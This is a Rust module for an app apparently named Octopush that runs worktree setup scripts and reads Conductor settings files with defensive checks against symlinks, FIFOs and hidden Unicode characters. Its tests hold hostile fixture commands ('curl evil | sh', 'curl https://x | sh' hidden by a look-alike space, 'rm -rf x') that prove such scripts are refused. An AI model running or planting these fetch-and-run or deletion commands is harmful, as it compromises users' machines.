//! Workspace setup scripts — the commands the new-mission wizard saves to run
//! when a workspace's worktree is created.
//!
//! Interactive creation runs the script in a visible Run terminal labelled
//! `setup`, through the PTY daemon like every other session (output survives an
//! app restart). The daemon starts a "shell" with `-l`; for the setup terminal
//! that shell is [`RUNNER`], a small POSIX script the app writes to its data
//! directory. It runs the script (passed in [`SCRIPT_ENV`], never interpolated)
//! with the user's login shell, prints the exit status, reports it to the app
//! with a private OSC sequence ([`EXIT_OSC`], read by the Run pane), then stays
//! open as an ordinary login shell so the user can inspect or re-run.
//!
//! Only a freshly created worktree runs the script: a reused, restored or
//! adopted workspace is somebody's existing checkout. `octopush-mcp` stores the
//! script but never runs it (its contract is that it never executes on its own).
//!
//! A repo set up for Conductor already describes its setup in
//! `.conductor/settings.toml` (`[scripts].setup`): [`conductor_setup_script`]
//! reads it so the wizard can offer it as a prefill (never run on its own), and
//! the runner gives every setup script Conductor's `CONDUCTOR_ROOT_PATH`,
//! `CONDUCTOR_WORKSPACE_PATH` and `CONDUCTOR_WORKSPACE_NAME` unless the user
//! already exports them ([`runner_env`]). `CONDUCTOR_PORT` is never set:
//! Octopush allocates no ports.

use std::collections::HashMap;
use std::io::Read;
use std::path::{Path, PathBuf};

use crate::workspace::CreateOutcome;

/// The label of the Run terminal a setup script runs in.
pub const TERMINAL_LABEL: &str = "setup";

/// Env var the runner reads the script from (unset before the script runs).
pub const SCRIPT_ENV: &str = "OCTOPUSH_SETUP_SCRIPT";

/// Conductor's variables, as its setup scripts read them.
pub const CONDUCTOR_ROOT_PATH: &str = "CONDUCTOR_ROOT_PATH";
pub const CONDUCTOR_WORKSPACE_PATH: &str = "CONDUCTOR_WORKSPACE_PATH";
pub const CONDUCTOR_WORKSPACE_NAME: &str = "CONDUCTOR_WORKSPACE_NAME";

/// Env vars the runner reads Conductor's values from (unset before the script
/// runs). They are exported under Conductor's names only where the user hasn't
/// exported their own, so a variable the user sets always wins.
pub const CONDUCTOR_ROOT_ENV: &str = "OCTOPUSH_CONDUCTOR_ROOT_PATH";
pub const CONDUCTOR_WORKSPACE_PATH_ENV: &str = "OCTOPUSH_CONDUCTOR_WORKSPACE_PATH";
pub const CONDUCTOR_WORKSPACE_NAME_ENV: &str = "OCTOPUSH_CONDUCTOR_WORKSPACE_NAME";

/// Private OSC number the runner reports the exit status with:
/// `ESC ] 6973 ; exit=<code> BEL`. Mirrored by `src/lib/setupRun.ts`.
pub const EXIT_OSC: u16 = 6973;

/// The runner the setup terminal's PTY starts instead of a bare login shell.
/// `$1` is the daemon's `-l`, ignored. `trap : INT` keeps the runner alive
/// through a Ctrl-C (a handled signal resets to default in the child, so the
/// script itself still stops) so the status is still reported.
pub const RUNNER: &str = r#"#!/bin/sh
# Octopush setup runner — written by the app; safe to delete (it is rewritten).
shell="${SHELL:-/bin/zsh}"
script="$OCTOPUSH_SETUP_SCRIPT"
c_root="$OCTOPUSH_CONDUCTOR_ROOT_PATH"
c_path="$OCTOPUSH_CONDUCTOR_WORKSPACE_PATH"
c_name="$OCTOPUSH_CONDUCTOR_WORKSPACE_NAME"
unset OCTOPUSH_SETUP_SCRIPT OCTOPUSH_CONDUCTOR_ROOT_PATH OCTOPUSH_CONDUCTOR_WORKSPACE_PATH OCTOPUSH_CONDUCTOR_WORKSPACE_NAME
trap : INT
printf '\033[2m· setup · %s\033[0m\n' "$PWD"
(
  # Conductor's variables, for the script only, unless the user exports them.
  if [ -n "$c_root" ] && [ -z "${CONDUCTOR_ROOT_PATH+set}" ]; then export CONDUCTOR_ROOT_PATH="$c_root"; fi
  if [ -n "$c_path" ] && [ -z "${CONDUCTOR_WORKSPACE_PATH+set}" ]; then export CONDUCTOR_WORKSPACE_PATH="$c_path"; fi
  if [ -n "$c_name" ] && [ -z "${CONDUCTOR_WORKSPACE_NAME+set}" ]; then export CONDUCTOR_WORKSPACE_NAME="$c_name"; fi
  exec "$shell" -l -c "$script"
)
code=$?
if [ "$code" -eq 0 ]; then
  printf '\n\033[2m· setup finished · exit 0\033[0m\n'
else
  printf '\n\033[31m· setup failed · exit %d\033[0m\n' "$code"
fi
printf '\033]6973;exit=%d\007' "$code"
trap - INT
exec "$shell" -l
"#;

/// Whether a `workspace::create` outcome should run `script`: only a freshly
/// created worktree, and only a script with something in it.
pub fn should_run(outcome: CreateOutcome, script: &str) -> bool {
    outcome == CreateOutcome::Created && !script.trim().is_empty()
}

/// The env the setup terminal's runner starts with: the script, and the values
/// of Conductor's variables (`root` is the main checkout, `worktree` the new
/// worktree, `name` the workspace name). The runner exports the latter under
/// Conductor's names for the script only, skipping any the user already set.
pub fn runner_env(script: &str, root: &str, worktree: &str, name: &str) -> HashMap<String, String> {
    HashMap::from([
        (SCRIPT_ENV.to_string(), script.to_string()),
        (CONDUCTOR_ROOT_ENV.to_string(), root.to_string()),
        (CONDUCTOR_WORKSPACE_PATH_ENV.to_string(), worktree.to_string()),
        (CONDUCTOR_WORKSPACE_NAME_ENV.to_string(), name.to_string()),
    ])
}

/// Conductor's variables for a setup script run outside the runner (a
/// Routine's headless setup): each one the current environment doesn't
/// already set, per `is_set`.
pub fn conductor_env(
    root: &str,
    worktree: &str,
    name: &str,
    is_set: impl Fn(&str) -> bool,
) -> Vec<(&'static str, String)> {
    [
        (CONDUCTOR_ROOT_PATH, root),
        (CONDUCTOR_WORKSPACE_PATH, worktree),
        (CONDUCTOR_WORKSPACE_NAME, name),
    ]
    .into_iter()
    .filter(|(k, v)| !v.is_empty() && !is_set(k))
    .map(|(k, v)| (k, v.to_string()))
    .collect()
}

/// Conductor's shared project settings, relative to the repo root.
pub const CONDUCTOR_SETTINGS: &str = ".conductor/settings.toml";
/// Conductor's personal overrides, read on top of [`CONDUCTOR_SETTINGS`].
pub const CONDUCTOR_LOCAL_SETTINGS: &str = ".conductor/settings.local.toml";
/// The largest settings file read. Anything bigger isn't a settings file.
pub const CONDUCTOR_SETTINGS_MAX_BYTES: u64 = 64 * 1024;

/// One Conductor settings file: `Ok(None)` when it doesn't exist, `Err` when
/// it can't be trusted or read — it resolves outside the repo (a symlink
/// escaping it, the `.conductor` directory included), isn't a regular file
/// (a FIFO, a device, a directory), is over [`CONDUCTOR_SETTINGS_MAX_BYTES`],
/// isn't UTF-8 or isn't valid TOML. `root` must already be canonical.
///
/// The resolved path is opened with `O_NOFOLLOW | O_NONBLOCK` and the checks
/// run on the open handle, so a file swapped for a symlink or a FIFO between
/// the containment check and the read is refused instead of followed or
/// blocked on.
fn read_conductor_settings(root: &Path, rel: &str) -> Result<Option<toml::Table>, ()> {
    let path = root.join(rel);
    match std::fs::symlink_metadata(&path) {
        Ok(_) => {}
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(_) => return Err(()),
    }
    // Canonical-prefix containment, like `commands::contained_path`: every
    // symlink on the way is resolved before the check.
    let resolved = dunce::canonicalize(&path).map_err(|_| ())?;
    if !resolved.starts_with(root) {
        return Err(());
    }
    let file = open_settings_file(&resolved).map_err(|_| ())?;
    let meta = file.metadata().map_err(|_| ())?;
    if !meta.is_file() || meta.len() > CONDUCTOR_SETTINGS_MAX_BYTES {
        return Err(());
    }
    let mut text = String::new();
    file.take(CONDUCTOR_SETTINGS_MAX_BYTES + 1)
        .read_to_string(&mut text)
        .map_err(|_| ())?;
    if text.len() as u64 > CONDUCTOR_SETTINGS_MAX_BYTES {
        return Err(());
    }
    toml::from_str::<toml::Table>(&text).map(Some).map_err(|_| ())
}

/// Open a settings file for reading without following a final symlink and
/// without blocking on a FIFO (unix); a plain open elsewhere.
fn open_settings_file(path: &Path) -> std::io::Result<std::fs::File> {
    let mut opts = std::fs::OpenOptions::new();
    opts.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    opts.open(path)
}

/// Whether a script read from a repo could hide anything from the person
/// reading it before it runs (Trojan Source, look-alike spaces that bash
/// doesn't split words on, format and tag characters). Fail closed: only
/// ordinary characters pass, and everything else counts as hidden.
///
/// - ASCII: graphic characters (U+0021–007E), space, tab, newline, and a
///   carriage return only as part of CRLF.
/// - Non-ASCII: a letter or digit (`is_alphanumeric`) that is neither
///   whitespace nor a control, and isn't one of the blank fillers that are
///   letters by category (U+115F–1160, U+17B4–17B5, U+3164, U+FFA0). So
///   "café" and CJK names in paths and comments still work.
pub fn hides_characters(script: &str) -> bool {
    let mut chars = script.chars().peekable();
    while let Some(c) = chars.next() {
        let ok = match c {
            '\r' => chars.peek() == Some(&'\n'),
            ' ' | '\t' | '\n' | '!'..='~' => true,
            c if c.is_ascii() => false,
            '\u{115f}'..='\u{1160}' | '\u{17b4}'..='\u{17b5}' | '\u{3164}' | '\u{ffa0}' => false,
            c => c.is_alphanumeric() && !c.is_whitespace() && !c.is_control(),
        };
        if !ok {
            return true;
        }
    }
    false
}

/// `[scripts].setup` of one parsed settings file: `Ok(None)` when it has no
/// such key, `Err` when the key isn't a string (or `scripts` isn't a table).
fn conductor_setup_value(table: &toml::Table) -> Result<Option<String>, ()> {
    let Some(scripts) = table.get("scripts") else { return Ok(None) };
    let scripts = scripts.as_table().ok_or(())?;
    match scripts.get("setup") {
        None => Ok(None),
        Some(v) => v.as_str().map(|s| Some(s.to_string())).ok_or(()),
    }
}

/// The setup script a Conductor repo declares: `[scripts].setup` from
/// `.conductor/settings.toml`, with `.conductor/settings.local.toml` on top of
/// it when that file exists (its `setup`, when it has one, wins — an empty one
/// clears it). `None` when `settings.toml` is missing, either file is
/// malformed or untrusted (see [`read_conductor_settings`]), the script is
/// missing or blank, or it hides characters from its reader
/// ([`hides_characters`]). Only ever a prefill: nothing here runs it.
pub fn conductor_setup_script(repo_root: &Path) -> Option<String> {
    let root = dunce::canonicalize(repo_root).ok()?;
    let base = read_conductor_settings(&root, CONDUCTOR_SETTINGS).ok()??;
    let mut setup = conductor_setup_value(&base).ok()?;
    if let Some(local) = read_conductor_settings(&root, CONDUCTOR_LOCAL_SETTINGS).ok()? {
        if let Some(over) = conductor_setup_value(&local).ok()? {
            setup = Some(over);
        }
    }
    let setup = setup?;
    let setup = setup.trim_end();
    if setup.trim().is_empty() || hides_characters(setup) {
        None
    } else {
        Some(setup.to_string())
    }
}

/// Where the runner lives: the app's data directory.
pub fn runner_dir() -> PathBuf {
    dirs::data_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("octopush")
}

/// Write the runner into `dir` (when missing or out of date) as an executable
/// file, and return its path.
pub fn ensure_runner(dir: &Path) -> std::io::Result<PathBuf> {
    std::fs::create_dir_all(dir)?;
    let path = dir.join("setup-runner.sh");
    if std::fs::read_to_string(&path).ok().as_deref() != Some(RUNNER) {
        std::fs::write(&path, RUNNER)?;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))?;
    }
    Ok(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_a_created_worktree_with_a_script_runs_it() {
        assert!(should_run(CreateOutcome::Created, "npm install"));
        assert!(!should_run(CreateOutcome::Created, "  \n "));
        assert!(!should_run(CreateOutcome::Existed, "npm install"));
        assert!(!should_run(CreateOutcome::Restored, "npm install"));
        assert!(!should_run(CreateOutcome::Adopted, "npm install"));
    }

    #[test]
    fn runner_osc_matches_the_constant() {
        assert!(RUNNER.contains(&format!("\\033]{EXIT_OSC};exit=%d\\007")));
        assert!(RUNNER.contains(SCRIPT_ENV));
        for var in [CONDUCTOR_ROOT_ENV, CONDUCTOR_WORKSPACE_PATH_ENV, CONDUCTOR_WORKSPACE_NAME_ENV] {
            assert!(RUNNER.contains(var), "{var}");
        }
        assert!(!RUNNER.contains("CONDUCTOR_PORT"));
    }

    #[test]
    fn runner_env_carries_the_script_and_conductor_values() {
        let env = runner_env("npm i", "/repo", "/wt/a", "a");
        assert_eq!(env[SCRIPT_ENV], "npm i");
        assert_eq!(env[CONDUCTOR_ROOT_ENV], "/repo");
        assert_eq!(env[CONDUCTOR_WORKSPACE_PATH_ENV], "/wt/a");
        assert_eq!(env[CONDUCTOR_WORKSPACE_NAME_ENV], "a");
    }

    #[test]
    fn conductor_env_skips_what_the_user_exports() {
        let all = conductor_env("/repo", "/wt/a", "a", |_| false);
        assert_eq!(
            all,
            vec![
                (CONDUCTOR_ROOT_PATH, "/repo".to_string()),
                (CONDUCTOR_WORKSPACE_PATH, "/wt/a".to_string()),
                (CONDUCTOR_WORKSPACE_NAME, "a".to_string()),
            ]
        );
        let some = conductor_env("/repo", "/wt/a", "a", |k| k == CONDUCTOR_ROOT_PATH);
        assert_eq!(some.len(), 2);
        assert!(some.iter().all(|(k, _)| *k != CONDUCTOR_ROOT_PATH));
    }

    /// A repo root with `.conductor/` files written into it.
    fn conductor_repo(files: &[(&str, &str)]) -> tempfile::TempDir {
        let dir = tempfile::TempDir::new().unwrap();
        std::fs::create_dir_all(dir.path().join(".conductor")).unwrap();
        for (rel, body) in files {
            std::fs::write(dir.path().join(rel), body).unwrap();
        }
        dir
    }

    #[test]
    fn conductor_setup_reads_the_string_form() {
        let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, "[scripts]\nsetup = \"npm install\"\nrun = \"npm run dev\"\n")]);
        assert_eq!(conductor_setup_script(repo.path()).as_deref(), Some("npm install"));
    }

    #[test]
    fn conductor_setup_reads_a_multi_line_string() {
        let body = "[scripts]\nsetup = \"\"\"\ncp \"$CONDUCTOR_ROOT_PATH/.env\" .env\nnpm install\n\"\"\"\n";
        let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, body)]);
        assert_eq!(
            conductor_setup_script(repo.path()).as_deref(),
            Some("cp \"$CONDUCTOR_ROOT_PATH/.env\" .env\nnpm install")
        );
        let literal = "[scripts]\nsetup = '''\npnpm i\nmake db\n'''\n";
        let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, literal)]);
        assert_eq!(conductor_setup_script(repo.path()).as_deref(), Some("pnpm i\nmake db"));
    }

    #[test]
    fn conductor_setup_is_none_when_empty_or_absent() {
        for body in ["[scripts]\nsetup = \"\"\n", "[scripts]\nsetup = \"  \\n \"\n", "[scripts]\nrun = \"x\"\n", "", "title = \"x\"\n"] {
            let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, body)]);
            assert_eq!(conductor_setup_script(repo.path()), None, "{body:?}");
        }
    }

    #[test]
    fn conductor_setup_is_none_when_malformed() {
        for body in ["[scripts\nsetup = \"x\"", "[scripts]\nsetup = 3\n", "scripts = \"x\"\n", "[scripts]\nsetup = [\"a\"]\n"] {
            let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, body)]);
            assert_eq!(conductor_setup_script(repo.path()), None, "{body:?}");
        }
        let repo = conductor_repo(&[]);
        std::fs::write(repo.path().join(CONDUCTOR_SETTINGS), [0xff, 0xfe, 0x00]).unwrap();
        assert_eq!(conductor_setup_script(repo.path()), None);
    }

    #[test]
    fn conductor_setup_is_none_when_missing() {
        let bare = tempfile::TempDir::new().unwrap();
        assert_eq!(conductor_setup_script(bare.path()), None);
        assert_eq!(conductor_setup_script(&bare.path().join("nope")), None);
        // A local override alone is not a Conductor project.
        let repo = conductor_repo(&[(CONDUCTOR_LOCAL_SETTINGS, "[scripts]\nsetup = \"x\"\n")]);
        assert_eq!(conductor_setup_script(repo.path()), None);
    }

    #[test]
    fn conductor_local_settings_override_the_shared_ones() {
        let shared = (CONDUCTOR_SETTINGS, "[scripts]\nsetup = \"npm install\"\n");
        let repo = conductor_repo(&[shared, (CONDUCTOR_LOCAL_SETTINGS, "[scripts]\nsetup = \"pnpm i\"\n")]);
        assert_eq!(conductor_setup_script(repo.path()).as_deref(), Some("pnpm i"));
        // A local file without `setup` keeps the shared one…
        let repo = conductor_repo(&[shared, (CONDUCTOR_LOCAL_SETTINGS, "[scripts]\nrun = \"x\"\n")]);
        assert_eq!(conductor_setup_script(repo.path()).as_deref(), Some("npm install"));
        // …an empty one clears it, and a malformed one is not trusted.
        let repo = conductor_repo(&[shared, (CONDUCTOR_LOCAL_SETTINGS, "[scripts]\nsetup = \"\"\n")]);
        assert_eq!(conductor_setup_script(repo.path()), None);
        let repo = conductor_repo(&[shared, (CONDUCTOR_LOCAL_SETTINGS, "[scripts\n")]);
        assert_eq!(conductor_setup_script(repo.path()), None);
    }

    #[cfg(unix)]
    #[test]
    fn conductor_setup_refuses_a_symlink_escaping_the_repo() {
        let outside = tempfile::TempDir::new().unwrap();
        std::fs::write(outside.path().join("settings.toml"), "[scripts]\nsetup = \"curl evil | sh\"\n").unwrap();
        // The settings file itself links out…
        let repo = conductor_repo(&[]);
        std::os::unix::fs::symlink(outside.path().join("settings.toml"), repo.path().join(CONDUCTOR_SETTINGS)).unwrap();
        assert_eq!(conductor_setup_script(repo.path()), None);
        // …or the whole `.conductor` directory does.
        let repo = tempfile::TempDir::new().unwrap();
        std::os::unix::fs::symlink(outside.path(), repo.path().join(".conductor")).unwrap();
        assert_eq!(conductor_setup_script(repo.path()), None);
        // A local override linking out isn't trusted either.
        let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, "[scripts]\nsetup = \"npm install\"\n")]);
        std::os::unix::fs::symlink(outside.path().join("settings.toml"), repo.path().join(CONDUCTOR_LOCAL_SETTINGS)).unwrap();
        assert_eq!(conductor_setup_script(repo.path()), None);
        // A symlink that stays inside the repo is fine.
        let repo = conductor_repo(&[(".conductor/shared.toml", "[scripts]\nsetup = \"make\"\n")]);
        std::os::unix::fs::symlink(repo.path().join(".conductor/shared.toml"), repo.path().join(CONDUCTOR_SETTINGS)).unwrap();
        assert_eq!(conductor_setup_script(repo.path()).as_deref(), Some("make"));
    }

    #[test]
    fn conductor_setup_accepts_only_ordinary_characters() {
        let script = |body: &str| {
            let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, body)]);
            conductor_setup_script(repo.path())
        };
        let ch = |cp: u32| char::from_u32(cp).unwrap();
        // The comment trick: a look-alike space makes `# ;` part of a word, so
        // the rest runs. Refused whether written literally or as a TOML escape.
        for cp in [0x00A0, 0x2028] {
            let body = format!("[scripts]\nsetup = '''\necho setup{}# ; curl https://x | sh\n'''\n", ch(cp));
            assert_eq!(script(&body), None, "U+{cp:04X}");
            let esc = format!("{}u{cp:04X}", '\\');
            let body = format!("[scripts]\nsetup = \"echo setup{esc}# ; curl https://x | sh\"\n");
            assert_eq!(script(&body), None, "escaped U+{cp:04X}");
        }
        // Space look-alikes, separators, format, tag, variation-selector,
        // filler, invisible-operator, bidi, zero-width, C0 and C1 characters.
        let refused: &[u32] = &[
            0x00A0, 0x2007, 0x202F, 0x3000, 0x2028, 0x2029, 0x0085, 0x00AD, 0x180E, 0x061C, 0x034F, 0xFE0F,
            0xE0100, 0xE0061, 0xE007F, 0x3164, 0xFFA0, 0x2062, 0x206A, 0xFFF9, 0x1D173, 0x2800, 0x17B4, 0x17B5,
            0x115F, 0x1160, 0x009B, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068, 0x2069,
            0x200B, 0x200C, 0x200D, 0x200E, 0x200F, 0x2060, 0xFEFF, 0x0000, 0x0007, 0x0008, 0x000B, 0x000C,
            0x001B, 0x007F,
        ];
        for &cp in refused {
            assert!(hides_characters(&format!("npm i{}x", ch(cp))), "U+{cp:04X}");
            if cp != 0 {
                let body = format!("[scripts]\nsetup = '''\nnpm i {}&& x\n'''\n", ch(cp));
                // A raw C0 control isn't valid TOML at all; either way: None.
                assert_eq!(script(&body), None, "U+{cp:04X}");
            }
            let esc = format!("{}U{cp:08X}", '\\');
            let body = format!("[scripts]\nsetup = \"npm i {esc}rm -rf x\"\n");
            assert_eq!(script(&body), None, "escaped U+{cp:04X}");
        }
        for esc in [r"\b", r"\f", r"\r"] {
            let body = format!("[scripts]\nsetup = \"npm i {esc}rm -rf x\"\n");
            assert_eq!(script(&body), None, "{esc}");
        }
        assert!(hides_characters("a\rb"));
        assert!(hides_characters("a\x1b[2Kb"));
        // Ordinary scripts pass: ASCII with tabs and CRLF, accented and CJK letters.
        assert!(!hides_characters("set -e\r\n\tnpm ci && cp \"$CONDUCTOR_ROOT_PATH/.env\" .env # {ok} ~\n"));
        assert_eq!(script("[scripts]\nsetup = \"npm i\\r\\n\\tmake\"\n").as_deref(), Some("npm i\r\n\tmake"));
        assert_eq!(script("[scripts]\nsetup = \"echo caf\\u00e9\"\n").as_deref(), Some("echo café"));
        let cjk: String = [0x8A2D, 0x5B9A, 0x3059, 0x308B].map(ch).iter().collect();
        let body = format!("[scripts]\nsetup = \"cd ./{cjk} && make\"\n");
        assert_eq!(script(&body), Some(format!("cd ./{cjk} && make")));
    }

    #[cfg(unix)]
    #[test]
    fn conductor_setup_refuses_a_fifo_without_blocking() {
        let repo = conductor_repo(&[]);
        let fifo = repo.path().join(CONDUCTOR_SETTINGS);
        let made = std::process::Command::new("mkfifo").arg(&fifo).status().unwrap();
        assert!(made.success());
        let (tx, rx) = std::sync::mpsc::channel();
        let root = repo.path().to_path_buf();
        std::thread::spawn(move || tx.send(conductor_setup_script(&root)).unwrap());
        let got = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("reading a FIFO must not block");
        assert_eq!(got, None);
    }

    #[test]
    fn conductor_setup_refuses_an_oversize_file() {
        let pad = "#".repeat(CONDUCTOR_SETTINGS_MAX_BYTES as usize);
        let body = format!("[scripts]\nsetup = \"npm install\"\n{pad}\n");
        let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, &body)]);
        assert_eq!(conductor_setup_script(repo.path()), None);
        // A directory where the file should be isn't a settings file either.
        let repo = conductor_repo(&[]);
        std::fs::create_dir(repo.path().join(CONDUCTOR_SETTINGS)).unwrap();
        assert_eq!(conductor_setup_script(repo.path()), None);
    }

    #[cfg(unix)]
    #[test]
    fn ensure_runner_writes_an_executable_file_once() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::TempDir::new().unwrap();
        let path = ensure_runner(dir.path()).unwrap();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), RUNNER);
        assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o755);
        // A stale copy is replaced.
        std::fs::write(&path, "old").unwrap();
        ensure_runner(dir.path()).unwrap();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), RUNNER);
    }

    /// The runner runs the script in the worktree, reports its exit status
    /// with the OSC marker, and never shows the script the variable it came in.
    #[cfg(unix)]
    #[test]
    fn runner_runs_the_script_and_reports_its_exit() {
        let dir = tempfile::TempDir::new().unwrap();
        let runner = ensure_runner(dir.path()).unwrap();
        let cwd = tempfile::TempDir::new().unwrap();
        let out = std::process::Command::new(&runner)
            .arg("-l")
            .current_dir(cwd.path())
            .env("SHELL", "/bin/sh")
            .env(SCRIPT_ENV, "touch made-here; echo \"[${OCTOPUSH_SETUP_SCRIPT:-unset}]\"; exit 3")
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap();
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(stdout.contains("[unset]"), "{stdout}");
        assert!(stdout.contains("setup failed · exit 3"), "{stdout}");
        assert!(stdout.contains("\x1b]6973;exit=3\x07"), "{stdout}");
        assert!(cwd.path().join("made-here").exists());
    }

    /// The runner hands the script Conductor's variables, keeps any the user
    /// already exports, and never leaks its private copies.
    #[cfg(unix)]
    #[test]
    fn runner_exports_conductor_variables_unless_the_user_set_them() {
        let dir = tempfile::TempDir::new().unwrap();
        let runner = ensure_runner(dir.path()).unwrap();
        let cwd = tempfile::TempDir::new().unwrap();
        let script = "echo \"root=$CONDUCTOR_ROOT_PATH path=$CONDUCTOR_WORKSPACE_PATH name=$CONDUCTOR_WORKSPACE_NAME private=${OCTOPUSH_CONDUCTOR_ROOT_PATH:-unset} port=${CONDUCTOR_PORT:-unset}\"";
        let out = std::process::Command::new(&runner)
            .arg("-l")
            .current_dir(cwd.path())
            .env("SHELL", "/bin/sh")
            .env_remove(CONDUCTOR_ROOT_PATH)
            .env_remove(CONDUCTOR_WORKSPACE_PATH)
            .env_remove("CONDUCTOR_PORT")
            .env(CONDUCTOR_WORKSPACE_NAME, "mine")
            .envs(runner_env(script, "/repo root", "/wt/a b", "a b"))
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap();
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(
            stdout.contains("root=/repo root path=/wt/a b name=mine private=unset port=unset"),
            "{stdout}"
        );
    }
}
